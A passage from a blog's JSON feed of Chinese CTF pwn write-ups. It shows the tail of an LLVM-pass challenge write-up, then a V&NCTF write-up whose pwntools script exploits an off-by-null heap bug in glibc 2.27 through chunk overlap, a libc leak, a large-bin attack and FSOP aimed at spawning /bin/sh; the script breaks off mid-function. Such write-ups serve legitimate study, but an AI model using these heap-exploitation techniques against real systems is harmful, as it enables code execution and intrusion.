43499\n  %184 &#x3D; add nsw i64 %183, 43499\n  %185 &#x3D; add nsw i64 %184, 43499\n  %186 &#x3D; add nsw i64 %185, 43499\n  %187 &#x3D; add nsw i64 %186, 43499\n  %188 &#x3D; add nsw i64 %187, 43499\n  %189 &#x3D; add nsw i64 %188, 43499\n  %190 &#x3D; add nsw i64 %189, 43499\n  %191 &#x3D; add nsw i64 %190, 43499\n  %192 &#x3D; add nsw i64 %191, 43499\n  %193 &#x3D; add nsw i64 %192, 43499\n  %194 &#x3D; add nsw i64 %193, 43499\n  %195 &#x3D; add nsw i64 %194, 43499\n  %196 &#x3D; add nsw i64 %195, 43499\n  %197 &#x3D; add nsw i64 %196, 43499\n  %198 &#x3D; add nsw i64 %197, 43499\n  %199 &#x3D; add nsw i64 %198, 43499\n  %200 &#x3D; add nsw i64 %199, 43499\n  %201 &#x3D; add nsw i64 %200, 43499\n  %202 &#x3D; add nsw i64 %201, 43499\n  %203 &#x3D; add nsw i64 %202, 43499\n  %204 &#x3D; add nsw i64 %203, 43499\n  %205 &#x3D; add nsw i64 %204, 43499\n  %206 &#x3D; add nsw i64 %205, 43499\n  %207 &#x3D; add nsw i64 %206, 43499\n  %208 &#x3D; add nsw i64 %207, 43499\n  %209 &#x3D; add nsw i64 %208, 43499\n  %210 &#x3D; add nsw i64 %209, 43499\n  %211 &#x3D; add nsw i64 %210, 43499\n  %212 &#x3D; add nsw i64 %211, 43499\n  %213 &#x3D; add nsw i64 %212, 43499\n  %214 &#x3D; add nsw i64 %213, 43499\n  %215 &#x3D; add nsw i64 %214, 43499\n  %216 &#x3D; add nsw i64 %215, 43499\n  %217 &#x3D; add nsw i64 %216, 43499\n  %218 &#x3D; add nsw i64 %217, 43499\n  %219 &#x3D; add nsw i64 %218, 43499\n  %220 &#x3D; add nsw i64 %219, 43499\n  %221 &#x3D; add nsw i64 %220, 43499\n  %222 &#x3D; add nsw i64 %221, 43499\n  %223 &#x3D; add nsw i64 %222, 43499\n  %224 &#x3D; add nsw i64 %223, 43499\n  %225 &#x3D; add nsw i64 %224, 43499\n  %226 &#x3D; add nsw i64 %225, 43499\n  %227 &#x3D; add nsw i64 %226, 43499\n  %228 &#x3D; add nsw i64 %227, 43499\n  %229 &#x3D; add nsw i64 %228, 43499\n  %230 &#x3D; add nsw i64 %229, 43499\n  %231 &#x3D; add nsw i64 %230, 43499\n  %232 &#x3D; add nsw i64 %231, 43499\n  %233 &#x3D; add nsw i64 %232, 43499\n  %234 &#x3D; add nsw i64 %233, 43499\n  %235 &#x3D; add nsw i64 %234, 43499\n  %236 &#x3D; add nsw i64 %235, 43499\n  %237 &#x3D; add nsw i64 %236, 43499\n  %238 &#x3D; add nsw i64 %237, 43499\n  %239 &#x3D; add nsw i64 %238, 43499\n  %240 &#x3D; add nsw i64 %239, 43499\n  %241 &#x3D; add nsw i64 %240, 43499\n  %242 &#x3D; add nsw i64 %241, 43499\n  %243 &#x3D; add nsw i64 %242, 43499\n  %244 &#x3D; add nsw i64 %243, 43499\n  %245 &#x3D; add nsw i64 %244, 43499\n  %246 &#x3D; add nsw i64 %245, 43499\n  %247 &#x3D; add nsw i64 %246, 43499\n  %248 &#x3D; add nsw i64 %247, 43499\n  %249 &#x3D; add nsw i64 %248, 43499\n  %250 &#x3D; add nsw i64 %249, 43499\n  %251 &#x3D; add nsw i64 %250, 43499\n  %252 &#x3D; add nsw i64 %251, 43499\n  %253 &#x3D; add nsw i64 %252, 43499\n  %254 &#x3D; add nsw i64 %253, 43499\n  %255 &#x3D; add nsw i64 %254, 43499\n  %256 &#x3D; add nsw i64 %255, 43499\n  %257 &#x3D; add nsw i64 %256, 43499\n  %258 &#x3D; add nsw i64 %257, 43499\n  %259 &#x3D; add nsw i64 %258, 43499\n  %260 &#x3D; add nsw i64 %259, 43499\n  %261 &#x3D; add nsw i64 %260, 43499\n  %262 &#x3D; add nsw i64 %261, 43499\n  %263 &#x3D; add nsw i64 %262, 43499\n  %264 &#x3D; add nsw i64 %263, 43499\n  %265 &#x3D; add nsw i64 %264, 43499\n  %266 &#x3D; add nsw i64 %265, 43499\n  %267 &#x3D; add nsw i64 %266, 43499\n  %268 &#x3D; add nsw i64 %267, 43499\n  %269 &#x3D; add nsw i64 %268, 43499\n  %270 &#x3D; add nsw i64 %269, 43499\n  %271 &#x3D; add nsw i64 %270, 43499\n  %272 &#x3D; add nsw i64 %271, 43499\n  %273 &#x3D; add nsw i64 %272, 43499\n  %274 &#x3D; add nsw i64 %273, 43499\n  %275 &#x3D; add nsw i64 %274, 43499\n  %276 &#x3D; add nsw i64 %275, 43499\n  %277 &#x3D; add nsw i64 %276, 43499\n  %278 &#x3D; add nsw i64 %277, 43499\n  %279 &#x3D; add nsw i64 %278, 43499\n  %280 &#x3D; add nsw i64 %279, 43499\n  %281 &#x3D; add nsw i64 %280, 43499\n  %282 &#x3D; add nsw i64 %281, 43499\n  %283 &#x3D; add nsw i64 %282, 43499\n  %284 &#x3D; add nsw i64 %283, 43499\n  %285 &#x3D; add nsw i64 %284, 43499\n  %286 &#x3D; add nsw i64 %285, 43499\n  %287 &#x3D; add nsw i64 %286, 43499\n  %288 &#x3D; add nsw i64 %287, 43499\n  %289 &#x3D; add nsw i64 %288, 43499\n  %290 &#x3D; add nsw i64 %289, 43499\n  %291 &#x3D; add nsw i64 %290, 43499\n  %292 &#x3D; add nsw i64 %291, 43499\n  %293 &#x3D; add nsw i64 %292, 43499\n  %294 &#x3D; add nsw i64 %293, 43499\n  %295 &#x3D; add nsw i64 %294, 43499\n  %296 &#x3D; add nsw i64 %295, 43499\n  %297 &#x3D; add nsw i64 %296, 43499\n  %298 &#x3D; add nsw i64 %297, 43499\n  %299 &#x3D; add nsw i64 %298, 43499\n  %300 &#x3D; add nsw i64 %299, 43499\n  %301 &#x3D; add nsw i64 %300, 43499\n  %302 &#x3D; add nsw i64 %301, 43499\n  %303 &#x3D; add nsw i64 %302, 43499\n  %304 &#x3D; add nsw i64 %303, 43499\n  %305 &#x3D; add nsw i64 %304, 43499\n  %306 &#x3D; add nsw i64 %305, 43499\n  %307 &#x3D; add nsw i64 %306, 43499\n  %308 &#x3D; add nsw i64 %307, 43499\n  %309 &#x3D; add nsw i64 %308, 43499\n  %310 &#x3D; add nsw i64 %309, 43499\n  %311 &#x3D; add nsw i64 %310, 43499\n  %312 &#x3D; add nsw i64 %311, 43499\n  %313 &#x3D; add nsw i64 %312, 1\n  %314 &#x3D; add nsw i64 %313, 1\n  %315 &#x3D; add nsw i64 %314, 1\n  %316 &#x3D; add nsw i64 %315, 1\n  %317 &#x3D; add nsw i64 %316, 1\n  %318 &#x3D; add nsw i64 %317, 1\n  %319 &#x3D; add nsw i64 %318, 1\n  %320 &#x3D; add nsw i64 %319, 1\n  %321 &#x3D; add nsw i64 %320, 1\n\n  ret i64 %321\n&#125;</code></pre>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>作为一种比较新的 pwn 题类型，可以发现其实只是把攻击换了一个形式，同样是整数溢出、数组越界、shellcode，套上 llvm 的皮后确实也难倒了我，通过这几道题，学习到了 llvm 的一些知识，层层解析后貌似也没那么难。最后，针对 qwb 题目而言，这么多函数居然一个没用上，有点意外（逃。</p>\n",
            "tags": [
                "PWN",
                "LLVM"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/V&NCTF-WriteUp-Niyah/",
            "url": "http://niyah.cn/CTF/V&NCTF-WriteUp-Niyah/",
            "title": "V&NCTF-WriteUp-Niyah",
            "date_published": "2022-02-13T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>还是 tcl</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"vnctf-writeup-niyah\"><a class=\"markdownIt-Anchor\" href=\"#vnctf-writeup-niyah\">#</a> V&amp;NCTF-WriteUp-Niyah</h1>\n<p>Niyah</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h2>\n<p>HindOnHeap 没 IO 函数玩不明白，冰墩墩估计最后要弹个 shell，webpwn 没试过网络编程，摆了</p>\n<h3 id=\"fshuimaster\"><a class=\"markdownIt-Anchor\" href=\"#fshuimaster\">#</a> FShuiMaster</h3>\n<p>2.27 下的 offbynull，只能申请 Large Bin 以上的堆块</p>\n<p>思路很清晰，直接构造堆块重叠，之后 Large Bin Attack 打 _IO_list_all 最后退出程序时执行 Fsop</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./FShuiMaster'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm','-g','1234', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'28791'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'words?'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'change'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'scan'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'off'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">pack_file</span><span class=\"token punctuation\">(</span>_flags <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_marker <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _IO_chain <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _lock <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    _mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    file_struct <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>_flags<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_read_ptr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_read_end<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_read_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_write_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_write_ptr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_write_end<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_buf_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_buf_end<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_save_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_backup_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_save_end<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_marker<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p64<span class=\"token punctuation\">(</span>_IO_chain<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> \\\n        p32<span class=\"token punctuation\">(</span>_fileno<span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">=</span> file_struct<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>_lock<span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">=</span> file_struct<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>_wide_data<span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">=</span> file_struct<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xc0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>_mode<span class=\"token punctuation\">)</span>\n    file_struct <span class=\"token operator\">=</span> file_struct<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xd8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> file_struct\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'the Book\\n'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'/bin/sh\\x00\\n'</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x608</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x500</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x610</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x510</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x608</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    __malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n    system_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    binsh_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\n    IO_list_all <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span>\n    